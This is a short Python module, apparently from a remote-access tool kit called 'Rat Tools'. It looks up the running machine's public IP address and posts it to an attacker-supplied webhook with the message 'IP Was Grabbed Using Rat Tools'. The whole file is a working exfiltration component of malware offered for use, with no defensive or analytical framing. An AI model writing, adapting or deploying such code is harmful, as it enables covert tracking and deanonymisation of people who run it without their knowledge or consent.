import requests


def getip():
    api = "https://api.ipify.org/?format=text"
    return requests.get(api).text

def sendip(webhook):
    requests.post(webhook, json={"content": f"IP Was Grabbed Using Rat Tools: {getip()}"})